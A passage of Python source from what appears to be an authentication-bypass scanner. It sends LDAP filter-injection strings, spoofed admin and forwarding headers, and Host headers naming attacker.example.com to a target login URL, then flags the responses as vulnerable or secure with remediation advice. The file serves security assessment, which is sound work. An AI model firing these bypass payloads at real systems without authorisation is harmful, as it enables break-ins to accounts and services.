                              "set. Never allow comma, equals or DC/OU components "
                              "in usernames.",
                              refs=["OWASP WSTG-INPV-06"])
            except Exception:
                pass
        return _f(_CID, _PROTO, _TITLE, "SECURE", "High", 7.5,
                  "T1078", "Valid Accounts",
                  "CWE-116", "A03:2021", "CB-3.3", "PTES-6.2",
                  "Server rejected LDAP DN injection payloads in username field.",
                  "Maintain input validation on username field.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_ld04(target: AuthTarget, timeout: int) -> AuthFinding:
    """LD-04: LDAP Filter Escape Bypass"""
    _CID = "LD-04"
    _PROTO = "LDAP"
    _TITLE = "LDAP Filter Escape Bypass"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        escape_payloads = [
            "\\2a)(uid=*))(|(uid=\\2a",
            "\\00",
            "(|(uid=*))",
        ]
        for payload in escape_payloads:
            try:
                r = s.post(target.url,
                           data={"username": payload, "password": "wrong"},
                           timeout=timeout)
                body_lower = r.text.lower()
                for pat in ["ldap", "javax.naming", "filter error",
                            "invalid filter"]:
                    if pat in body_lower:
                        return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "High", 7.5,
                                  "T1190", "Exploit Public-Facing Application",
                                  "CWE-116", "A03:2021", "CB-3.3", "PTES-6.2",
                                  f"LDAP error triggered by hex-encoded filter "
                                  f"payload {payload!r}: {pat!r} in response.",
                                  "Verify LDAP library correctly handles "
                                  "hex-escaped metacharacters. "
                                  "Use parameterised LDAP queries.",
                                  refs=["RFC 4515", "OWASP WSTG-INPV-06"])
            except Exception:
                pass
        return _f(_CID, _PROTO, _TITLE, "SECURE", "High", 7.5,
                  "T1190", "Exploit Public-Facing Application",
                  "CWE-116", "A03:2021", "CB-3.3", "PTES-6.2",
                  "No LDAP errors triggered by hex-escaped filter payloads.",
                  "Maintain LDAP filter escaping.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


# ---------------------------------------------------------------------------
# XW -- SAML Signature Wrapping (3 checks — manual guidance)
# ---------------------------------------------------------------------------

def _check_xw01(target: AuthTarget, timeout: int) -> AuthFinding:
    """XW-01: XML Signature Wrapping (XSW)"""
    return _f("XW-01", "SAML XSW", "XML Signature Wrapping (XSW)",
              "NOT_APPLICABLE", "Critical", 9.1,
              "T1550", "Use Alternate Authentication Material",
              "CWE-347", "A07:2021", "CB-3.6", "PTES-6.1",
              "XSW requires a valid, signed SAMLResponse to modify. Test manually "
              "using SAML Raider (Burp Suite plugin). Try all 8 XSW variants: "
              "duplicate Assertion before/after Signature, wrap in Extensions, "
              "modify NameID in unsigned copy while valid Signature covers original.",
              "Process only the Assertion element referenced by ds:Reference in "
              "the Signature. Reject documents with multiple Assertion elements. "
              "Use a hardened SAML library (e.g. python-saml >= 2.9.0).",
              refs=["Somorovsky et al. - On Breaking SAML",
                    "OWASP SAML Cheatsheet"])


def _check_xw02(target: AuthTarget, timeout: int) -> AuthFinding:
    """XW-02: XML Comment Injection in NameID"""
    return _f("XW-02", "SAML XSW", "XML Comment Injection in NameID",
              "NOT_APPLICABLE", "High", 8.1,
              "T1078", "Valid Accounts",
              "CWE-91", "A07:2021", "CB-3.6", "PTES-6.1",
              "Test XML comment injection manually: modify NameID in SAMLResponse "
              "to 'admin<!---->@company.com'. Some parsers strip comments, making "
              "the effective NameID 'admin@company.com'.",
              "Use an XML parser that preserves comments before normalisation. "
              "Validate NameID after canonicalisation.",
              refs=["OWASP SAML Cheatsheet"])


def _check_xw03(target: AuthTarget, timeout: int) -> AuthFinding:
    """XW-03: Multiple Assertion Bodies"""
    return _f("XW-03", "SAML XSW", "Multiple Assertion Bodies",
              "NOT_APPLICABLE", "Critical", 8.8,
              "T1550", "Use Alternate Authentication Material",
              "CWE-347", "A07:2021", "CB-3.6", "PTES-6.1",
              "Test whether SP processes first or last Assertion when two are "
              "present in a SAMLResponse. If last is processed without signature "
              "coverage, attacker-controlled Assertion may be accepted.",
              "Reject SAMLResponse with more than one Assertion element. "
              "Process only the Assertion explicitly referenced by the Signature.",
              refs=["Somorovsky et al. - On Breaking SAML"])


# ---------------------------------------------------------------------------
# RM -- Response Manipulation (4 checks)
# ---------------------------------------------------------------------------

def _check_rm01(target: AuthTarget, timeout: int) -> AuthFinding:
    """RM-01: JSON Boolean Auth Response"""
    _CID = "RM-01"
    _PROTO = "Response Manipulation"
    _TITLE = "JSON Boolean Auth Response (Manipulable)"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        r = s.post(target.url,
                   data={"username": "test", "password": "wrongpass"},
                   headers={"Accept": "application/json"},
                   timeout=timeout)
        try:
            data = r.json()
            bool_keys = [
                k for k, v in data.items()
                if isinstance(v, bool) and k.lower() in
                ("success", "authenticated", "isloggedin", "error",
                 "ok", "result", "authorized", "loggedin")
            ]
            if bool_keys:
                return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "High", 7.5,
                          "T1565.002", "Transmitted Data Manipulation",
                          "CWE-807", "A07:2021", "CB-3.5", "PTES-6.1",
                          f"Authentication response contains boolean fields "
                          f"{bool_keys} that can be flipped from false to true "
                          "via proxy interception (Burp/ZAP Match-and-Replace).",
                          "Never make access control decisions based on a boolean "
                          "in the HTTP response. Use server-side session state only.",
                          refs=["OWASP WSTG-ATHN-01"])
        except Exception:
            pass
        return _f(_CID, _PROTO, _TITLE, "SECURE", "High", 7.5,
                  "T1565.002", "Transmitted Data Manipulation",
                  "CWE-807", "A07:2021", "CB-3.5", "PTES-6.1",
                  "Response does not contain manipulable boolean auth fields.",
                  "Continue using server-side session-based auth decisions.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_rm02(target: AuthTarget, timeout: int) -> AuthFinding:
    """RM-02: HTTP Status Manipulation"""
    _CID = "RM-02"
    _PROTO = "Response Manipulation"
    _TITLE = "HTTP Status Code-Based Auth (Manipulable)"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        r = s.post(target.url,
                   data={"username": "admin", "password": "wrongpass"},
                   timeout=timeout)
        if r.status_code in (401, 403):
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "High", 7.2,
                      "T1565.002", "Transmitted Data Manipulation",
                      "CWE-807", "A07:2021", "CB-3.5", "PTES-6.1",
                      f"Auth failure returns HTTP {r.status_code}. If the "
                      "application's UI or redirect logic is client-side-driven "
                      "purely by HTTP status code, a proxy can flip 401/403 to "
                      "200, potentially bypassing the client-side auth check.",
                      "Implement server-side session validation on all protected "
                      "routes. Client-side code should never be the sole auth guard.",
                      refs=["OWASP WSTG-ATHN-01"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "High", 7.2,
                  "T1565.002", "Transmitted Data Manipulation",
                  "CWE-807", "A07:2021", "CB-3.5", "PTES-6.1",
                  f"Response status {r.status_code} does not suggest "
                  "client-side-only status code auth.",
                  "Maintain server-side session validation.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_rm03(target: AuthTarget, timeout: int) -> AuthFinding:
    """RM-03: Arbitrary Header Auth Injection"""
    _CID = "RM-03"
    _PROTO = "Response Manipulation"
    _TITLE = "Arbitrary Header Auth Injection"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        inject_headers = {
            "X-Admin": "true",
            "X-Auth-Token": "admin",
            "X-User-Role": "admin",
            "X-Override-Auth": "1",
            "X-Forwarded-User": "admin",
            "X-Remote-User": "admin",
        }
        normal_r = s.get(target.url, timeout=timeout)
        normal_len = len(normal_r.text)
        normal_code = normal_r.status_code
        for header, value in inject_headers.items():
            s2 = _session(target)
            s2.headers[header] = value
            try:
                r = s2.get(target.url, timeout=timeout)
                if r.status_code != normal_code or abs(
                    len(r.text) - normal_len
                ) > 500:
                    return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "High", 7.5,
                              "T1078", "Valid Accounts",
                              "CWE-287", "A07:2021", "CB-3.5", "PTES-6.1",
                              f"Header injection {header}: {value!r} caused "
                              f"different response: HTTP {r.status_code} vs "
                              f"normal {normal_code}, body delta "
                              f"{abs(len(r.text)-normal_len)}B.",
                              "Strip and ignore all X-Admin, X-Auth-Token, "
                              "X-User-Role and similar headers at the edge "
                              "(load balancer / WAF). Never trust client-supplied "
                              "auth headers.",
                              refs=["OWASP WSTG-ATHN-01"])
            except Exception:
                pass
        return _f(_CID, _PROTO, _TITLE, "SECURE", "High", 7.5,
                  "T1078", "Valid Accounts",
                  "CWE-287", "A07:2021", "CB-3.5", "PTES-6.1",
                  "Server ignored auth-override headers; no response difference "
                  "detected.",
                  "Maintain header stripping policy at the edge.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_rm04(target: AuthTarget, timeout: int) -> AuthFinding:
    """RM-04: Redirect Bypass After Failed Auth"""
    _CID = "RM-04"
    _PROTO = "Response Manipulation"
    _TITLE = "Redirect Bypass After Failed Authentication"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        r = s.post(target.url,
                   data={"username": "admin", "password": "wrongpass"},
                   timeout=timeout, allow_redirects=False)
        if r.status_code in (301, 302):
            loc = r.headers.get("Location", "")
            if loc:
                s2 = _session(target)
                dest = loc if loc.startswith("http") else target.base_url + loc
                r2 = s2.get(dest, timeout=timeout, allow_redirects=False)
                if r2.status_code == 200 and any(
                    kw in r2.text.lower() for kw in
                    ["dashboard", "welcome", "account", "profile"]
                ):
                    return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "High", 6.1,
                              "T1078", "Valid Accounts",
                              "CWE-601", "A07:2021", "CB-3.5", "PTES-6.1",
                              f"Failed auth redirects to {loc!r} which returns "
                              f"HTTP 200 with authenticated content. Bypassing "
                              "the redirect manually grants access.",
                              "Validate session/auth state server-side on the "
                              "destination page, not just at the redirect.",
                              refs=["OWASP WSTG-ATHN-01"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "High", 6.1,
                  "T1078", "Valid Accounts",
                  "CWE-601", "A07:2021", "CB-3.5", "PTES-6.1",
                  "No exploitable redirect bypass after failed authentication.",
                  "Maintain server-side auth validation on all protected pages.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


# ---------------------------------------------------------------------------
# HH -- Host Header Injection (3 checks)
# ---------------------------------------------------------------------------

def _check_hh01(target: AuthTarget, timeout: int) -> AuthFinding:
    """HH-01: Host Header Poisoning"""
    _CID = "HH-01"
    _PROTO = "Host Header"
    _TITLE = "Host Header Injection / Poisoning"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        attacker = "attacker.example.com"
        s.headers["Host"] = attacker
        r = s.get(target.url, timeout=timeout, allow_redirects=False)
        if attacker in r.text or attacker in r.headers.get("Location", ""):
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "High", 6.1,
                      "T1598", "Phishing for Information",
                      "CWE-644", "A07:2021", "CB-3.5", "PTES-6.1",
                      f"Host header {attacker!r} is reflected in server response "
                      "or Location header. This enables password reset link "
                      "poisoning and cache poisoning attacks.",
                      "Whitelist permitted Host header values in the web server "
                      "or application configuration. Reject requests with "
                      "unexpected Host values (HTTP 400).",
                      refs=["PortSwigger Host Header Attacks",
                            "OWASP WSTG-CONF-02"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "High", 6.1,
                  "T1598", "Phishing for Information",
                  "CWE-644", "A07:2021", "CB-3.5", "PTES-6.1",
                  f"Attacker-controlled Host header was not reflected in response.",
                  "Maintain Host header whitelist.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_hh02(target: AuthTarget, timeout: int) -> AuthFinding:
    """HH-02: X-Forwarded-Host Bypass"""
    _CID = "HH-02"
    _PROTO = "Host Header"
    _TITLE = "X-Forwarded-Host / X-Host Header Injection"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        attacker = "attacker.example.com"
        for header in ["X-Forwarded-Host", "X-Host",
                       "X-Forwarded-Server", "X-Original-Host"]:
            s2 = _session(target)
            s2.headers[header] = attacker
            try:
                r = s2.get(target.url, timeout=timeout, allow_redirects=False)
                if attacker in r.text or attacker in r.headers.get("Location", ""):
                    return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "High", 6.1,
                              "T1598", "Phishing for Information",
                              "CWE-644", "A07:2021", "CB-3.5", "PTES-6.1",
                              f"Header {header}: {attacker!r} is reflected in "
                              "response. Proxy-forwarded Host headers are trusted "
                              "without validation.",
                              "Strip X-Forwarded-Host and similar headers at the "
                              "edge unless from a trusted reverse proxy. "
                              "Configure the application to use a hardcoded base URL.",
                              refs=["PortSwigger Host Header Attacks",
                                    "OWASP WSTG-CONF-02"])
            except Exception:
                pass
        return _f(_CID, _PROTO, _TITLE, "SECURE", "High", 6.1,
                  "T1598", "Phishing for Information",
                  "CWE-644", "A07:2021", "CB-3.5", "PTES-6.1",
                  "X-Forwarded-Host and similar headers not reflected in response.",
                  "Maintain proxy header validation.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_hh03(target: AuthTarget, timeout: int) -> AuthFinding:
    """HH-03: Forwarded / True-Client-IP Header"""
    _CID = "HH-03"
    _PROTO = "Host Header"
    _TITLE = "Forwarded / True-Client-IP Header Injection"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        attacker = "attacker.example.com"
        headers_to_test = {
            "Forwarded": f"host={attacker}",
            "True-Client-IP": "127.0.0.1",
            "X-Real-IP": "127.0.0.1",
            "X-Forwarded-For": f"127.0.0.1, {attacker}",
        }
        for header, value in headers_to_test.items():
            s2 = _session(target)
            s2.headers[header] = value
            try:
                r = s2.get(target.url, timeout=timeout, allow_redirects=False)
                if attacker in r.text or "127.0.0.1" in r.text and (
                    "admin" in r.text.lower() or "bypass" in r.text.lower()
                ):
                    return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Medium", 5.4,
                              "T1598", "Phishing for Information",
                              "CWE-644", "A05:2021", "CB-3.5", "PTES-6.1",
                              f"{header}: {value!r} reflected in response or "
                              "caused access control difference.",
                              "Validate and strip Forwarded, True-Client-IP, "
                              "X-Real-IP headers at the trusted reverse proxy level. "
                              "Never use these for access control decisions.",
                              refs=["RFC 7239", "OWASP WSTG-CONF-02"])
            except Exception:
                pass
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Medium", 5.4,
                  "T1598", "Phishing for Information",
                  "CWE-644", "A05:2021", "CB-3.5", "PTES-6.1",
                  "Forwarded and IP override headers not reflected or acted upon.",
                  "Maintain edge-level header stripping.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


# ---------------------------------------------------------------------------
# Check Registry
# ---------------------------------------------------------------------------

_ALL_CHECKS = {
    # OAuth2 / OIDC
    "OA-01": _check_oa01,
    "OA-02": _check_oa02,
    "OA-03": _check_oa03,
    "OA-04": _check_oa04,
    "OA-05": _check_oa05,
    "OA-06": _check_oa06,
    "OA-07": _check_oa07,
    "OA-08": _check_oa08,
    "OA-09": _check_oa09,
    "OA-10": _check_oa10,
    "OA-11": _check_oa11,
    "OA-12": _check_oa12,
    # SAML 2.0
    "SA-01": _check_sa01,
    "SA-02": _check_sa02,
    "SA-03": _check_sa03,
    "SA-04": _check_sa04,
    "SA-05": _check_sa05,
    "SA-06": _check_sa06,
    # JWT
    "JW-01": _check_jw01,
    "JW-02": _check_jw02,
    "JW-03": _check_jw03,
    "JW-04": _check_jw04,
    "JW-05": _check_jw05,
    "JW-06": _check_jw06,
    "JW-07": _check_jw07,
    "JW-08": _check_jw08,
    # Multi-Step
    "MS-01": _check_ms01,
    "MS-02": _check_ms02,
    "MS-03": _check_ms03,
    "MS-04": _check_ms04,
    "MS-05": _check_ms05,
    # Password Page
    "PP-01": _check_pp01,
    "PP-02": _check_pp02,
    "PP-03": _check_pp03,
    "PP-04": _check_pp04,
    "PP-05": _check_pp05,
    "PP-06": _check_pp06,
    # Password Reset
    "PR-01": _check_pr01,
    "PR-02": _check_pr02,
    "PR-03": _check_pr03,
    "PR-04": _check_pr04,
    "PR-05": _check_pr05,
    # Enumeration
    "EN-01": _check_en01,
    "EN-02": _check_en02,
    "EN-03": _check_en03,
    "EN-04": _check_en04,
    # Social Login
    "SL-01": _check_sl01,
    "SL-02": _check_sl02,
    "SL-03": _check_sl03,
    "SL-04": _check_sl04,
    # Basic Auth
    "BA-01": _check_ba01,
    "BA-02": _check_ba02,
    "BA-03": _check_ba03,
    "BA-04": _check_ba04,
    # API Key
    "AK-01": _check_ak01,
    "AK-02": _check_ak02,
    "AK-03": _check_ak03,
    "AK-04": _check_ak04,
    # Session
    "SE-01": _check_se01,
    "SE-02": _check_se02,
    "SE-03": _check_se03,
    "SE-04": _check_se04,
    "SE-05": _check_se05,
    # LDAP
    "LD-01": _check_ld01,
    "LD-02": _check_ld02,
    "LD-03": _check_ld03,
    "LD-04": _check_ld04,
    # SAML XSW
    "XW-01": _check_xw01,
    "XW-02": _check_xw02,
    "XW-03": _check_xw03,
    # Response Manipulation
    "RM-01": _check_rm01,
    "RM-02": _check_rm02,
    "RM-03": _check_rm03,
    "RM-04": _check_rm04,
    # Host Header
    "HH-01": _check_hh01,
    "HH-02": _check_hh02,
    "HH-03": _check_hh03,
}

# Protocol -> check prefix mapping
_PROTOCOL_MAP: Dict[str, List[str]] = {
    "oauth2": ["OA"],
    "oidc":   ["OA"],
    "saml":   ["SA", "XW"],
    "jwt":    ["JW"],
    "multistep": ["MS"],
    "password":  ["PP"],
    "reset":     ["PR"],
    "enumeration": ["EN"],
    "social":    ["SL"],
    "basic":     ["BA"],
    "apikey":    ["AK"],
    "session":   ["SE"],
    "ldap":      ["LD"],
    "xsw":       ["XW"],
    "response":  ["RM"],
    "hostheader": ["HH"],
    "all":    list({
        pfx for pfxs in [
            ["OA"], ["SA"], ["JW"], ["MS"], ["PP"], ["PR"], ["EN"],
            ["SL"], ["BA"], ["AK"], ["SE"], ["LD"], ["XW"], ["RM"], ["HH"]
        ] for pfx in pfxs
    }),
}
# Always add these protocol-agnostic checks for any target
_ALWAYS_RUN = ["MS-02", "MS-05", "SE-01", "SE-03", "SE-05",
               "RM-03", "HH-01", "HH-02", "HH-03",
               "BA-03", "BA-04", "PP-02", "EN-03"]


# ---------------------------------------------------------------------------
# Main entry point
# ---------------------------------------------------------------------------

def run_assessment(
    target: AuthTarget,
    protocols: Optional[List[str]] = None,
    checks: Optional[List[str]] = None,
    log_fn: Optional[Callable] = None,
    timeout: int = 12,
) -> dict:
    """
    Run the universal authentication bypass assessment.

    Args:
        target    : AuthTarget instance
        protocols : list of protocol names to test, or None for auto-detect
        checks    : explicit list of check IDs to run (overrides protocols)
        log_fn    : callback for live log messages
        timeout   : per-request timeout in seconds

    Returns dict with keys:
        scan_id, target_url, protocol_detected, findings, vulnerable_count,
        secure_count, na_count, error_count, summary, mitre_ids,
        severity_counts, protocols_tested, checks_run
    """
    global _log_fn
    _log_fn = log_fn

    if not _REQUESTS_OK:
        _log("WARNING: 'requests' library not installed. "
             "All checks will return NOT_APPLICABLE.")

    # Determine which checks to run
    if checks:
        selected = {k: v for k, v in _ALL_CHECKS.items() if k in checks}
    else:
        proto = target.protocol
        if proto == "auto":
            proto = detect_protocol(target.url)
            _log(f"Auto-detected protocol: {proto!r}")
        target.protocol = proto

        if protocols:
            prefixes = set()
            for p in protocols:
                for pfx in _PROTOCOL_MAP.get(p.lower(), []):
                    prefixes.add(pfx)
        else:
            prefixes = set()
            for pfx in _PROTOCOL_MAP.get(proto, []):
                prefixes.add(pfx)
            if proto == "auto" or proto == "all":
                for pfxs in _PROTOCOL_MAP.values():
                    for pfx in pfxs:
                        prefixes.add(pfx)
        if not prefixes:
            prefixes = {
                pfx for pfxs in _PROTOCOL_MAP.values() for pfx in pfxs
            }
        always = set(_ALWAYS_RUN)
        selected = {
            k: v for k, v in _ALL_CHECKS.items()
            if any(k.startswith(pfx) for pfx in prefixes) or k in always
        }

    _log(f"Starting auth bypass assessment: {target.url}")
    _log(f"Protocol: {target.protocol!r} | Checks to run: {len(selected)}")

    findings: List[AuthFinding] = []
    lock = threading.Lock()

    def _run(check_id: str, fn) -> None:
        _log(f"[AUTH-BYPASS] Running {check_id} ...")
        try:
            result = fn(target, timeout)
            color = {
                "VULNERABLE":      "VULNERABLE",
                "SECURE":          "SECURE",
                "NOT_APPLICABLE":  "N/A",
                "ERROR":           "ERROR",
            }.get(result.status, result.status)
            _log(f"[AUTH-BYPASS] {check_id}: {color} "
                 f"| {result.evidence[:80]}")
        except Exception as exc:
            result = _err(check_id,
                         fn.__doc__.split(":")[1].strip()
                         if fn.__doc__ else "Unknown",
                         check_id, exc)
        with lock:
            findings.append(result)

    with ThreadPoolExecutor(max_workers=8) as pool:
        futs = {pool.submit(_run, cid, fn): cid
                for cid, fn in selected.items()}
        for _ in as_completed(futs):
            pass

    findings.sort(key=lambda f: f.check_id)

    vuln    = [f for f in findings if f.status == "VULNERABLE"]
    secure  = [f for f in findings if f.status == "SECURE"]
    na      = [f for f in findings if f.status == "NOT_APPLICABLE"]
    err     = [f for f in findings if f.status == "ERROR"]
    mitre_ids = sorted({f.mitre_id for f in vuln if f.mitre_id})

    sev_counts: Dict[str, int] = {
        "Critical": 0, "High": 0, "Medium": 0, "Low": 0, "Info": 0
    }
    for f in vuln:
        if f.severity in sev_counts:
            sev_counts[f.severity] += 1

    if vuln:
        summary = (
            f"{len(vuln)} bypass vector(s) identified -- immediate "
            f"remediation required. MITRE: {', '.join(mitre_ids) or 'N/A'}"
        )
    elif secure:
        summary = (
            f"All {len(secure)} tested checks passed. "
            "Authentication implementation appears resilient."
        )
    else:
        summary = (
            "Assessment complete -- no definitive results. "
            "Check target URL, connectivity and credentials."
        )

    _log(f"Assessment complete: {len(vuln)} VULNERABLE | "
         f"{len(secure)} SECURE | {len(na)} N/A | {len(err)} ERROR")

    import uuid as _uuid
    res_dict = {
        "scan_id":           _uuid.uuid4().hex[:12],
        "target_url":        target.url,
        "protocol_detected": target.protocol,
        "findings":          [f.to_dict() for f in findings],
        "vulnerable_count":  len(vuln),
        "secure_count":      len(secure),
        "na_count":          len(na),
        "error_count":       len(err),
        "summary":           summary,
        "mitre_ids":         mitre_ids,
        "severity_counts":   sev_counts,
        "protocols_tested":  sorted({f.protocol for f in findings}),
        "checks_run":        len(findings),
        "start_time":        time.time(),
        "status":            "done",
    }

    try:
        from cyber_range.services.scan_history_service import save_scan
        save_scan(res_dict)
    except Exception as _hist_err:
        _log(f"Warning: Failed to save scan to history database: {_hist_err}")

    return res_dict
